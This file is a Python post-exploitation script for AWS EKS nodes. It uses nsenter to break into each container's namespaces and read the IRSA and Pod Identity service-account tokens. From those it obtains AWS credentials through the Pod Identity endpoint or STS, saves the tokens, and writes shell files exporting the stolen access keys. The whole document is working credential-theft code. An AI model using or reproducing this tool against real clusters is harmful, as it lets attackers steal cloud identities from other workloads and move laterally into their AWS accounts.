#!/usr/bin/env python3
import subprocess
import os
import json
import argparse
from pathlib import Path

REGION = "us-west-2"
IRSA_TOKEN_PATH = "/var/run/secrets/eks.amazonaws.com/serviceaccount/token"
POD_IDENTITY_PATH = "/var/run/secrets/pods.eks.amazonaws.com/serviceaccount/eks-pod-identity-token"
POD_IDENTITY_CRED_ENDPOINT = "http://169.254.170.23/v1/credentials"
TOKEN_DIR = "tokens"

def run_cmd(cmd):
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            return result.stdout.strip()
    except Exception:
        pass
    return None

def find_container_pids():
    output = run_cmd(["ctr", "-n", "k8s.io", "task", "ls"])
    pids = []
    if output:
        for line in output.splitlines()[1:]:
            pid = line.split()[1]
            pids.append(pid)
    return pids

def assume_role_with_web_identity(token, role_arn, session_name):
    cmd = [
        "aws", "sts", "assume-role-with-web-identity",
        "--role-arn", role_arn,
        "--role-session-name", session_name,
        "--web-identity-token", token,
        "--region", REGION
    ]
    output = run_cmd(cmd)
    if output:
        try:
            creds = json.loads(output)["Credentials"]
            return creds
        except Exception:
            pass
    return None

def dump_export_file(filename, creds):
    with open(filename, "w") as f:
        f.write(f"export AWS_ACCESS_KEY_ID={creds['AccessKeyId']}\n")
        f.write(f"export AWS_SECRET_ACCESS_KEY={creds['SecretAccessKey']}\n")
        f.write(f"export AWS_SESSION_TOKEN={creds['SessionToken']}\n")
    print(f"✅ Export file written: {filename}")

def save_token_to_file(token, name_prefix, index):
    Path(TOKEN_DIR).mkdir(parents=True, exist_ok=True)
    path = os.path.join(TOKEN_DIR, f"{name_prefix}_{index}.token")
    with open(path, "w") as f:
        f.write(token)
    print(f"📦 {name_prefix.capitalize()} token saved to: {path}")

def fetch_pod_identity_credentials(pid, index):
    token_cmd = [
        "nsenter", "--target", pid, "--mount", "--uts", "--ipc", "--net", "--pid", "--",
        "cat", POD_IDENTITY_PATH
    ]
    token = run_cmd(token_cmd)
    if not token:
        return None

    save_token_to_file(token, "podidentity", index)

    curl_cmd = [
        "nsenter", "--target", pid, "--mount", "--uts", "--ipc", "--net", "--pid", "--",
        "curl", "-s", "-H", f"Authorization: {token}", POD_IDENTITY_CRED_ENDPOINT
    ]
    result = run_cmd(curl_cmd)
    if result:
        try:
            return json.loads(result)
        except json.JSONDecodeError:
            return None
    return None

def fetch_oidc_token(pid, index, role_arn, session_name):
    token_cmd = [
        "nsenter", "--target", pid, "--mount", "--uts", "--ipc", "--net", "--pid", "--",
        "cat", IRSA_TOKEN_PATH
    ]
    token = run_cmd(token_cmd)
    if not token:
        return None

    save_token_to_file(token, "oidc", index)

    creds = assume_role_with_web_identity(token, role_arn, session_name)
    return creds

def main():
    parser = argparse.ArgumentParser(description="Extract IRSA and Pod Identity credentials from container PIDs.")
    parser.add_argument("--tokens-only", action="store_true", help="Only extract tokens (OIDC and Pod Identity).")
    parser.add_argument("--keys-only", action="store_true", help="Only extract credential keys (no token storage).")
    parser.add_argument("--role-arn", help="OIDC Role ARN to assume.")
    parser.add_argument("--session-name", help="Session name to use when assuming OIDC role.")
    parser.add_argument("--region", default="us-west-2", help="AWS region (default: us-west-2)")
    args = parser.parse_args()

    global REGION
    REGION = args.region

    pids = find_container_pids()
    oidc_count = 0
    podid_count = 0

    print("🔍 Scanning PIDs for IRSA / Pod Identity tokens...\n")

    for pid in pids:
        # --- OIDC IRSA Token ---
        if not args.keys_only:
            cmd_check = ["nsenter", "--target", pid, "--mount", "--uts", "--ipc", "--net", "--pid", "--", "ls", IRSA_TOKEN_PATH]
            if run_cmd(cmd_check):
                print(f"✅ Found OIDC token in PID {pid}")
                role_arn = args.role_arn or input("Enter OIDC Role ARN to assume: ").strip()
                session_name = args.session_name or input("Enter session name: ").strip()
                creds = fetch_oidc_token(pid, oidc_count + 1, role_arn, session_name)
                if creds:
                    oidc_count += 1
                    fname = f"oidc_{oidc_count}.sh"
                    dump_export_file(fname, creds)
                continue

        # --- Pod Identity Token ---
        if not args.tokens_only:
            cmd_check = ["nsenter", "--target", pid, "--mount", "--uts", "--ipc", "--net", "--pid", "--", "ls", POD_IDENTITY_PATH]
            if run_cmd(cmd_check):
                print(f"✅ Found Pod Identity token in PID {pid}")
                creds = fetch_pod_identity_credentials(pid, podid_count + 1)
                if creds and all(k in creds for k in ["AccessKeyId", "SecretAccessKey", "Token"]):
                    podid_count += 1
                    fname = f"podidentity_{podid_count}.sh"
                    export_creds = {
                        "AccessKeyId": creds["AccessKeyId"],
                        "SecretAccessKey": creds["SecretAccessKey"],
                        "SessionToken": creds["Token"]
                    }
                    dump_export_file(fname, export_creds)
                else:
                    print(f"⚠️ Failed to fetch credentials via Pod Identity for PID {pid}")
                continue

    if oidc_count == 0 and podid_count == 0:
        print("\n❌ No credentials found.")
    else:
        print(f"\n🎉 Done. Found {oidc_count} OIDC and {podid_count} Pod Identity credential sets.")
        print("📂 To use:")
        for i in range(1, oidc_count + 1):
            print(f"source oidc_{i}.sh  # token: tokens/oidc_{i}.token")
        for i in range(1, podid_count + 1):
            print(f"source podidentity_{i}.sh  # token: tokens/podidentity_{i}.token")

if __name__ == "__main__":
    main()
